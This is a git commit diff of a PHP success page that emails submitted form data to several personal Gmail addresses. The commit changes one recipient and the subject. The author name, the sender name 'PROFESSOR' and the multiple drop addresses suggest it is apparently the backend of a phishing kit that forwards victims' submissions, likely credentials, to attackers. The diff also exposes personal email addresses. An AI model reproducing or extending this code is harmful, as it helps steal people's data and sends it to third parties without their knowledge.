4e02450ff57fd65e5cca0fe51fc651840715d6f8
issue-policy <167228070+issue-policy@users.noreply.github.com>
2024-04-16 08:57:17 -0700

    Update success.php

--- success.php
+++ success.php
@@ -38,13 +38,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->setFrom('anthonyjoshua762668@gmail.com', 'PROFESSOR');
         $mail->addAddress('mahboobalinizamani@gmail.com');
          $mail->addAddress('bilalkingmaryjohn@gmail.com');
-       $mail->addAddress('bilawal.king.part1@gmail.com');
+       $mail->addAddress('how37773@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'mashoq';
+        $mail->Subject = 'king';
         $mail->Body = $emailBody; // Set the email body using the collected form data
         
         // Send email
